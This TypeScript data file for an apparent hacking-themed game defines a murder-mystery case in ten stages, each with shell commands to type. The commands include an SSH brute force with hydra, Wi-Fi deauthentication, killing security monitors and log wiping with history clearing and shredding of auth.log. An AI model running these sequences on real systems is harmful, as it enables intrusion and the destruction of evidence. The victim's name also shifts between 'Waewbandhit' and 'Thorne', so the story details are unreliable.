import type { CaseFile } from '../types/case';

export const CASE_BLACK_CHIMERA: CaseFile = {
  id: 'CASE_001_BLACK_CHIMERA',
  caseCode: 'CASE-0x89 // OPERATION BLACK CHIMERA',
  title: 'The Neural Homicide at NeuroTech Nexus',
  classification: 'TOP SECRET // CYBER-HOMICIDE DIVISION',
  targetEntity: 'NeuroTech Nexus Corp. (Zurich Underground R&D)',
  targetIP: '10.42.0.1:443',
  securityThreatLevel: 'CLASS-V MIL-SPEC ICE',
  briefing:
    'Dr. Ashira Waewbandhit, Chief Neural Architect, was found dead with catastrophically overloaded cyber-implants inside cleanroom 4A. Corporate PR reports an accidental hardware overload, but classified telemetry confirms his neural research on "The Chimera Engine" was exfiltrated minutes before the fatal voltage discharge. Penetrate NeuroTech\'s 10-tier defense matrix, unmask the internal assassin, and secure the weapon schematics before they are auctioned to the dark syndicate.',
  passiveTraceRate: 1.54, // Baseline for Stage 1 (~65 seconds on Normal)
  stages: [
    {
      stageIndex: 0,
      title: 'Stage 1: Perimeter Reconnaissance & Relay Probe',
      narrativeLog: '[PHASE 1 INITIATED] Probing NeuroTech public relay node. 5 security sequences required to breach perimeter.',
      timeLimitSeconds: 65,
      commands: [
        'ping -c 3 -W 1 10.42.0.1',
        'nmap -sS -p 22,80,443,8080 10.42.0.1',
        'curl -I https://relay.neurotech.ch/health',
        'traceroute -m 12 -q 1 10.42.0.1',
        'ssh-keyscan -p 22 10.42.0.1 > /tmp/hosts.sig'
      ],
      command: 'ping -c 3 -W 1 10.42.0.1',
      securityNode: 'EDGE-GATEWAY-ZURICH',
      asciiArt: `   ╔═════════════════════════════════════════════╗
   ║  [STAGE 1: EXTERNAL RELAY PROBE - 5 LINES]  ║
   ║                                             ║
   ║   [INTERNET] ──► [PORT:443] ──► [FIREWALL]  ║
   ║                     ▲                       ║
   ║                     │ [PROBING VULN GATE]   ║
   ║   ROUTING: 10.42.0.1:443 [ZURICH-RELAY]     ║
   ╚═════════════════════════════════════════════╝`,
      unlockedClue: {
        id: 'clue-stage-1',
        stageIndex: 0,
        timestamp: '21:04:18',
        category: 'INTERCEPT',
        headline: 'Covert DMZ Bridge to Cleanroom Subnet',
        snippet: 'Internal routing table reveals an unmonitored bridge forwarding encrypted telemetry directly to Zurich Cleanroom 4A at 10.42.88.10.',
        decrypted: false,
        metadata: 'ROUTE: 10.42.0.1 -> 10.42.88.10 [DMZ TUNNEL]',
      }
    },
    {
      stageIndex: 1,
      title: 'Stage 2: Bypassing Sentinel Perimeter ICE',
      narrativeLog: '[PHASE 2 INITIATED] Injecting firewall bypass & brute-forcing audit shell credentials. 7 sequences required.',
      timeLimitSeconds: 85,
      commands: [
        'iptables -A INPUT -p tcp --dport 8080 -j ACCEPT',
        'hping3 -S 10.42.88.10 -p 8080 -c 50',
        'nc -zvw3 10.42.88.10 9000-9010',
        'socat TCP-LISTEN:9090,fork TCP:10.42.88.10:9001 &',
        'hydra -l audit_guest -P /etc/dict/common.txt 10.42.88.10 ssh',
        'export AUTH_OVERRIDE="TOKEN_AUTH_7X_BYPASS"',
        'ssh -o StrictHostKeyChecking=no audit_guest@10.42.88.10'
      ],
      command: 'iptables -A INPUT -p tcp --dport 8080 -j ACCEPT',
      securityNode: 'SENTINEL-FIREWALL-ICE',
      asciiArt: `   ╔═════════════════════════════════════════════╗
   ║  [STAGE 2: SENTINEL FIREWALL ICE - 7 LINES] ║
   ║                                             ║
   ║   [ICE-SHIELD] ──► [SYN FLOOD] ──► [SOCKET] ║
   ║       ▲                  ▲                  ║
   ║   PORT:9001          AUTH:BYPASS            ║
   ║   STATUS: CRACKING AUDIT_GUEST CREDENTIALS  ║
   ╚═════════════════════════════════════════════╝`,
      unlockedClue: {
        id: 'clue-stage-2',
        stageIndex: 1,
        timestamp: '21:09:44',
        category: 'CREDENTIAL',
        headline: 'Security Camera 11-Minute Blackout',
        snippet: 'Surveillance logs show cleanroom 4A exterior optical sensors were intentionally blinded for 11 minutes coinciding with Dr. Thorne\'s time of death.',
        decrypted: false,
        metadata: 'TAMPER: SENSOR_BLACKOUT_23:41_TO_23:52',
      }
    },
    {
      stageIndex: 2,
      title: 'Stage 3: Forensic Cleanroom Biometrics Extraction',
      narrativeLog: '[PHASE 3 INITIATED] Deciphering biometric door access and implant telemetry. 9 sequences required.',
      timeLimitSeconds: 110,
      commands: [
        'cd /var/log/biometrics && ls -la',
        'cat /var/log/biometrics/door_04.log | grep -i thorne',
        'strings cleanroom_badge_dump.bin | head -n 20',
        'tcpdump -nn -r badge_reader.pcap -c 10',
        'sqlite3 security.db "SELECT * FROM badges WHERE room=\'4A\';"',
        'hashcat -m 1000 -a 0 badge_hash.txt /opt/dict/words.txt',
        'openssl sha256 /opt/vault/telemetry.dat',
        'diff -u baseline_firmware.bin cleanroom_patch.bin',
        'grep -E "FORCE_DISCHARGE|OVERVOLT" cleanroom_patch.bin'
      ],
      command: 'cd /var/log/biometrics && ls -la',
      securityNode: 'BIOMETRIC-VAULT-DB',
      asciiArt: `   ╔═════════════════════════════════════════════╗
   ║  [STAGE 3: FORENSIC BIOMETRIC VAULT - 9 L]  ║
   ║                                             ║
   ║   [DOOR_4A] ──► [BADGE HASH] ──► [OVERVOLT] ║
   ║   TELEMETRY DUMP: 240V NEURAL SURGE CONFIRM ║
   ║   KEY MATCH: EXEC_DIRECTOR_VALENTINE        ║
   ╚═════════════════════════════════════════════╝`,
      unlockedClue: {
        id: 'clue-stage-3',
        stageIndex: 2,
        timestamp: '21:13:02',
        category: 'IDENTITY',
        headline: 'Lethal Overvolt Signed by Director Valentine',
        snippet: 'Cleanroom firmware patch reveals an intentional high-voltage command injected into Dr. Thorne\'s bio-port, cryptographically signed with Director Helena Valentine\'s executive key.',
        decrypted: false,
        metadata: 'IDENTITY: Helena Valentine (R&D Director) // ASSASSIN',
      }
    },
    {
      stageIndex: 3,
      title: 'Stage 4: Financial Dark-Pool Escrow Extraction',
      narrativeLog: '[PHASE 4 INITIATED] Dumping illicit transaction tables and escrow vaults. 11 sequences required.',
      timeLimitSeconds: 130,
      commands: [
        'ssh -p 2202 auditor@10.42.88.25',
        'ps aux | grep -i ledger_daemon',
        'netstat -tulnp | grep 5432',
        'pg_dump -U postgres -d slush_fund -t transactions > /tmp/tx.sql',
        'grep -E "NULL_SECTOR|CAYMAN" /tmp/tx.sql',
        'awk \'{print $1, $4, $7}\' /tmp/tx.sql | head -n 15',
        'openssl enc -d -aes-256-cbc -in /var/data/escrow.enc -out /tmp/escrow.json',
        'jq \'.transfers[] | select(.amount > 10000000)\' /tmp/escrow.json',
        'curl -X POST -k https://10.42.88.25/api/v2/audit/freeze -d "account=0x7F"',
        'find /var/backups -name "*.wal" -mtime -1',
        'tar -czf /tmp/financial_proof.tar.gz /tmp/tx.sql /tmp/escrow.json'
      ],
      command: 'ssh -p 2202 auditor@10.42.88.25',
      securityNode: 'ESCROW-LEDGER-POSTGRES',
      asciiArt: `   ╔═════════════════════════════════════════════╗
   ║  [STAGE 4: DARK-POOL LEDGER DUMP - 11 L]    ║
   ║                                             ║
   ║   [PG_DUMP] ──► [AES ESCROW] ──► [CAYMAN]   ║
   ║   TRANSACTION: $85,000,000 RELEASED         ║
   ║   BENEFICIARY: ACCT_VALENTINE_OFFSHORE_0x7F ║
   ╚═════════════════════════════════════════════╝`,
      unlockedClue: {
        id: 'clue-stage-4',
        stageIndex: 3,
        timestamp: '21:18:22',
        category: 'FINANCIAL',
        headline: '$85M Bribe Escrow Released to Valentine',
        snippet: 'PostgreSQL ledger dump documents an $85,000,000 cryptocurrency escrow payment unlocked simultaneously with Dr. Thorne\'s death, payable to Valentine\'s offshore shell company.',
        decrypted: false,
        metadata: 'ESCROW: $85M PAID // BUYER: "NULL_SECTOR_7"',
      }
    },
    {
      stageIndex: 4,
      title: 'Stage 5: Security Drone Patrol Grid Override',
      narrativeLog: '[PHASE 5 INITIATED] Hijacking aerial patrol frequencies and grounding optical drones. 12 sequences required.',
      timeLimitSeconds: 145,
      commands: [
        'airmon-ng check kill',
        'iwconfig wlan0 mode monitor',
        'airodump-ng --bssid 00:14:D1:E8:22:90 wlan0',
        'aireplay-ng --deauth 15 -a 00:14:D1:E8:22:90 wlan0',
        'wpa_supplicant -B -i wlan0 -c /etc/drone_override.conf',
        'dhclient wlan0',
        'drone-cli --target DRONE_SWARM_ALPHA --auth root:KAIROS_SKY',
        'drone-cli --set-mode RTH_LAND --speed 0',
        'systemctl stop drone-telemetry-broker',
        'sed -i \'s/ALERT_ON_MOTION=true/ALERT_ON_MOTION=false/g\' /etc/patrol.cfg',
        'killall -9 drone_sentry_watchdog',
        'drone-cli status --all'
      ],
      command: 'airmon-ng check kill',
      securityNode: 'AERIAL-DRONE-MAST',
      asciiArt: `   ╔═════════════════════════════════════════════╗
   ║  [STAGE 5: DRONE SWARM OVERRIDE - 12 L]     ║
   ║                                             ║
   ║   [DEAUTH] ──► [WLAN0] ──► [LAND COMMAND]   ║
   ║   DRONE PATROL: FORCED LANDING CONFIRMED    ║
   ║   OPTICAL RADAR: PERMANENTLY DEACTIVATED    ║
   ╚═════════════════════════════════════════════╝`,
      unlockedClue: {
        id: 'clue-stage-5',
        stageIndex: 4,
        timestamp: '21:24:40',
        category: 'INTERCEPT',
        headline: 'Drone Flight Path Diverted Away from Cleanroom',
        snippet: 'Drone logs prove Director Valentine remotely modified rooftop sentry routes at 23:35 to create an unmonitored blind corridor for smuggling the prototype.',
        decrypted: false,
        metadata: 'AIRSPACE: SENTRY_CORRIDOR_SABOTAGED',
      }
    },
    {
      stageIndex: 5,
      title: 'Stage 6: Neural Mesh Core Infiltration',
      narrativeLog: '[PHASE 6 INITIATED] Port-forwarding into the primary Synapse Core cluster. 14 sequences required.',
      timeLimitSeconds: 165,
      commands: [
        'nmap -sU -p 161,162 10.42.99.1',
        'snmpwalk -v 2c -c public 10.42.99.1',
        'nc -u -w 2 10.42.99.1 9999',
        'telnet 10.42.99.1 2323',
        'export SYNAPSE_NODE_ID="CORE_CLUSTER_09"',
        'synapse-ctl --cluster-probe --id 0xDEADBEEF',
        'strace -p 4410 -e trace=network,memory',
        'lsof -i :9999',
        'cat /proc/sys/net/ipv4/ip_forward',
        'sysctl -w net.ipv4.ip_forward=1',
        'iptables -t nat -A PREROUTING -p tcp --dport 9999 -j REDIRECT --to-port 8888',
        'synapse-ctl --override-ice --depth 6',
        'grep -ri "CHIMERA_CORE" /etc/synapse/',
        'synapse-ctl --dump-node-ram /tmp/core_mesh.raw'
      ],
      command: 'nmap -sU -p 161,162 10.42.99.1',
      securityNode: 'SYNAPSE-SUPERCLUSTER',
      asciiArt: `   ╔═════════════════════════════════════════════╗
   ║  [STAGE 6: NEURAL MESH CLUSTER - 14 L]      ║
   ║                                             ║
   ║   [SNMP] ──► [IP_FORWARD] ──► [CHIMERA_RAM] ║
   ║   CLUSTER: SYNAPSE SUPERCLUSTER 09          ║
   ║   CORE MEMORY: RAW EXFILTRATION IN PROGRESS ║
   ╚═════════════════════════════════════════════╝`,
      unlockedClue: {
        id: 'clue-stage-6',
        stageIndex: 5,
        timestamp: '21:31:05',
        category: 'CREDENTIAL',
        headline: 'Master Encryption Key for Chimera Kernel',
        snippet: 'Memory dump yields the cryptographic master key required to unlock Dr. Thorne\'s encrypted neural blueprint and weapon schematics.',
        decrypted: false,
        metadata: 'KEY: 0x9F41_CHIMERA_ROOT_SYMMETRIC',
      }
    },
    {
      stageIndex: 6,
      title: 'Stage 7: Memory Dump Volatility Forensics',
      narrativeLog: '[PHASE 7 INITIATED] Dissecting unallocated kernel RAM for forensic artifacts. 15 sequences required.',
      timeLimitSeconds: 180,
      commands: [
        'volatility -f /tmp/core_mesh.raw imageinfo',
        'volatility -f /tmp/core_mesh.raw --profile=Linuxx64 pslist',
        'volatility -f /tmp/core_mesh.raw --profile=Linuxx64 netscan',
        'volatility -f /tmp/core_mesh.raw --profile=Linuxx64 linux_dump_map -p 1042',
        'strings /tmp/core_mesh.raw | grep -i "thorne_last_words"',
        'xxd -s 0x4A00 -l 128 /tmp/core_mesh.raw',
        'binwalk -e /tmp/core_mesh.raw',
        'foremost -t png,pdf,elf -i /tmp/core_mesh.raw -o /tmp/carved',
        'grep -rn "HELENA_VALENTINE_AUTH" /tmp/carved/',
        'md5sum /tmp/carved/elf/1042.elf',
        'sha256sum /tmp/carved/elf/1042.elf',
        'gdb --batch -ex "disassemble main" /tmp/carved/elf/1042.elf',
        'readelf -s /tmp/carved/elf/1042.elf | grep -i override',
        'objdump -d /tmp/carved/elf/1042.elf | head -n 30',
        'rm -rf /tmp/carved/temp'
      ],
      command: 'volatility -f /tmp/core_mesh.raw imageinfo',
      securityNode: 'VOLATILITY-FORENSIC-KERNEL',
      asciiArt: `   ╔═════════════════════════════════════════════╗
   ║  [STAGE 7: RAM VOLATILITY DISSECTION - 15L] ║
   ║                                             ║
   ║   [VOLATILITY] ──► [CARVING] ──► [GDB]      ║
   ║   RECONSTRUCTED: AUDIO WIRE IN MEMORY       ║
   ║   THORNE: "I will not let you sell this..." ║
   ╚═════════════════════════════════════════════╝`,
      unlockedClue: {
        id: 'clue-stage-7',
        stageIndex: 6,
        timestamp: '21:38:12',
        category: 'IDENTITY',
        headline: 'Audio Sub-Track: Dr. Thorne Confronting Valentine',
        snippet: 'Carved audio buffer contains Dr. Thorne refusing to hand over the Chimera Engine weaponization code, followed by Valentine manually executing the fatal discharge.',
        decrypted: false,
        metadata: 'AUDIO: "I won\'t let you sell this to Null Sector!"',
      }
    },
    {
      stageIndex: 7,
      title: 'Stage 8: Dark Syndicate Communications Wiretap',
      narrativeLog: '[PHASE 8 INITIATED] Intercepting Tor auction room and tracking bidding manifests. 17 sequences required.',
      timeLimitSeconds: 200,
      commands: [
        'ss -tulpn | grep 6667',
        'curl -s --socks5 127.0.0.1:9050 https://check.torproject.org',
        'tor-resolve nullsector7x.onion 127.0.0.1:9050',
        'irssi -c nullsector7x.onion -p 6697 -n GhostHunter',
        '/join #chimera-auction',
        '/msg NickServ IDENTIFY secret_key_77',
        'tcpdump -i any port 6697 -w /tmp/syndicate_irc.pcap',
        'tshark -r /tmp/syndicate_irc.pcap -Y "irc" -T fields -e irc.request.command',
        'grep -ai "reserve_price_120M" /tmp/syndicate_irc.pcap',
        'base64 -d /tmp/b64_cipher.txt > /tmp/auction_manifest.json',
        'jq .buyer_list /tmp/auction_manifest.json',
        'gpg --import /tmp/valentine_pubkey.asc',
        'gpg --verify /tmp/auction_manifest.sig /tmp/auction_manifest.json',
        'whois 198.51.100.44',
        'traceroute -I 198.51.100.44',
        'curl -k https://nullsector-bids.net/status',
        'shred -u /tmp/syndicate_irc.pcap'
      ],
      command: 'ss -tulpn | grep 6667',
      securityNode: 'DARKNET-AUCTION-RELAY',
      asciiArt: `   ╔═════════════════════════════════════════════╗
   ║  [STAGE 8: DARKNET ONION WIRETAP - 17 L]    ║
   ║                                             ║
   ║   [TOR_NODE] ──► [IRC_PCAP] ──► [GPG_SIG]   ║
   ║   AUCTION CHANNEL: #chimera-auction         ║
   ║   RESERVE PRICE: $120,000,000 [NULL SECTOR] ║
   ╚═════════════════════════════════════════════╝`,
      unlockedClue: {
        id: 'clue-stage-8',
        stageIndex: 7,
        timestamp: '21:46:50',
        category: 'FINANCIAL',
        headline: '$120M Starting Bid for Chimera Weapon Manifest',
        snippet: 'Decoded Tor IRC channel shows Valentine actively negotiating delivery of the Chimera neural override prototype with international arms broker "Null Sector".',
        decrypted: false,
        metadata: 'AUCTION: 120M CRYPTO // ASSET: CHIMERA_WEAPON',
      }
    },
    {
      stageIndex: 8,
      title: 'Stage 9: Counter-ICE Sentinel Hunter Duel',
      narrativeLog: '[PHASE 9 INITIATED] Counter-ICE Sentinel Tracer closing in. Neutralize trace daemons immediately! 18 sequences.',
      timeLimitSeconds: 215,
      commands: [
        'systemctl status sentinel-hunter.service',
        'killall -STOP sentinel_tracer',
        'kill -9 $(pgrep -f "hunter_tracer")',
        'iptables -I INPUT -s 10.42.0.0/16 -j DROP',
        'iptables -I OUTPUT -d 10.42.0.0/16 -j DROP',
        'route add -host 10.42.99.254 reject',
        'arp -d 10.42.0.1',
        'ip link set eth0 down && ip link set eth0 up',
        'macchanger -r eth0',
        'ip addr flush dev eth0',
        'dhclient -v eth0',
        'sysctl -w net.ipv4.icmp_echo_ignore_all=1',
        'service rsyslog stop',
        'logrotate -f /etc/logrotate.d/syslog',
        'echo 3 > /proc/sys/vm/drop_caches',
        'swapoff -a && swapon -a',
        'dmesg -c > /dev/null',
        'uptime'
      ],
      command: 'systemctl status sentinel-hunter.service',
      securityNode: 'SENTINEL-HUNTER-MATRIX',
      asciiArt: `   ╔═════════════════════════════════════════════╗
   ║  [STAGE 9: COUNTER-ICE DUEL - 18 LINES]     ║
   ║                                             ║
   ║   [SENTINEL_KILL] ──► [ARP_PURGE] ──► [MAC] ║
   ║   COUNTER-ICE: RADAR PACKETS DERAIL         ║
   ║   TRACE ACCUMULATION: PERMANENTLY SUPPRESSED║
   ╚═════════════════════════════════════════════╝`,
      unlockedClue: {
        id: 'clue-stage-9',
        stageIndex: 8,
        timestamp: '21:55:04',
        category: 'CREDENTIAL',
        headline: 'Counter-ICE Hunter Neutralized & Decoupled',
        snippet: 'NeuroTech\'s autonomous intrusion hunter daemon was successfully forced into a kernel panic, freezing all forensic tracking radars.',
        decrypted: false,
        metadata: 'TRACER: PANIC_DECOUPLED // RADAR_OFFLINE',
      }
    },
    {
      stageIndex: 9,
      title: 'Stage 10: Root Terminal Lockdown & Legal Indictment',
      narrativeLog: '[FINAL PHASE INITIATED] Securing root sovereignty and transmitting indictment packet to Interpol. 20 sequences.',
      timeLimitSeconds: 240,
      commands: [
        'sudo su -',
        'chmod 700 /root/.vault',
        'chown -R root:root /var/forensics',
        'lsattr /var/forensics/case_chimera.sig',
        'chattr +i /var/forensics/case_chimera.sig',
        'openssl dgst -sha512 -sign /etc/ssl/detective_private.pem /var/forensics/case_chimera.sig > /tmp/final_indictment.bundle',
        'tar -czvf /tmp/neurotech_indictment.tar.gz /var/forensics/',
        'gpg --symmetric --cipher-algo AES256 /tmp/neurotech_indictment.tar.gz',
        'curl -T /tmp/neurotech_indictment.tar.gz.gpg https://interpol.cyber.org/vault/inbox',
        'ssh admin@interpol.cyber.org "verify-bundle /vault/inbox/neurotech_indictment.tar.gz.gpg"',
        'killall -9 neurotech_daemon',
        'systemctl disable neurotech-main.service',
        'dd if=/dev/urandom of=/dev/shm/temp_keys.bin bs=1M count=32',
        'rm -f /dev/shm/temp_keys.bin',
        'history -c && history -w',
        'cat /dev/null > /root/.bash_history',
        'shred -u -z -n 35 /var/log/auth.log',
        'sync && sync',
        'echo "INDICTMENT DELIVERED - WARRANT ACTIVE FOR HELENA VALENTINE"',
        'exit'
      ],
      command: 'sudo su -',
      securityNode: 'MASTER-ROOT-VAULT',
      asciiArt: `   ╔═════════════════════════════════════════════╗
   ║  [STAGE 10: ROOT SOVEREIGNTY - 20 LINES]    ║
   ║                                             ║
   ║   [INTERPOL_BUNDLE] ──► [SHRED] ──► [EXIT]  ║
   ║   MISSION: ALL 10 DEFENSE TIERS COMPROMISED ║
   ║   WARRANT STATUS: ACTIVE // HELENA VALENTINE║
   ╚═════════════════════════════════════════════╝`,
      unlockedClue: {
        id: 'clue-stage-10',
        stageIndex: 9,
        timestamp: '22:04:19',
        category: 'IDENTITY',
        headline: 'International Cyber-Tribunal Red Notice Issued',
        snippet: 'Forensic dossier securely verified by Interpol Cyber Division. Red Notice warrant activated for Director Helena Valentine for premeditated homicide and illegal neuro-weapon trafficking.',
        decrypted: false,
        metadata: 'VERDICT: RED NOTICE ACTIVE // CASE CLOSED',
      }
    }
  ],
  conclusion: {
    culprit: 'Director Helena Valentine',
    title: 'Executive Director of Advanced Cyberware R&D',
    motive: 'Illegal Arms Trafficking & Premeditated Homicide ($120M Black-Market Syndicate Contract)',
    verdictSummary:
      'Executive Director Helena Valentine deliberately flashed weaponized firmware into Dr. Ashira Waewbandhit\'s neural port to trigger a fatal cranial surge after he refused to sell the Chimera Engine weaponization code. Valentine blinded optical cameras, diverted rooftop patrol drones, and attempted to auction the neural weapon to the Null Sector syndicate before our intrusion dismantled her infrastructure and delivered the legal indictment package to Interpol.',
    evidenceSummary: [
      'Discovered covert DMZ routing bridge leading directly into Cleanroom 4A.',
      'Proved exterior surveillance cameras were deliberately blinded for 11 minutes during time of death.',
      'Authenticated Valentine\'s cryptographic signature on the fatal overvolt firmware patch.',
      'Extracted $85M preliminary escrow bribe records payable to Valentine\'s offshore Cayman account.',
      'Discovered unauthorized drone swarm diversion schedule creating a blind getaway corridor.',
      'Recovered master encryption key for the Chimera neural override weapon kernel from RAM.',
      'Carved audio telemetry recording Dr. Thorne\'s final confrontation with Valentine.',
      'Intercepted live Tor onion auction negotiating $120M delivery with Null Sector arms brokers.',
      'Decoupled and neutralized autonomous counter-ICE Hunter tracer matrix.',
      'Secured airtight forensic package and delivered Interpol Red Notice warrant.'
    ]
  }
};

export const ALL_PLAYABLE_CASES: CaseFile[] = [
  CASE_BLACK_CHIMERA,
];
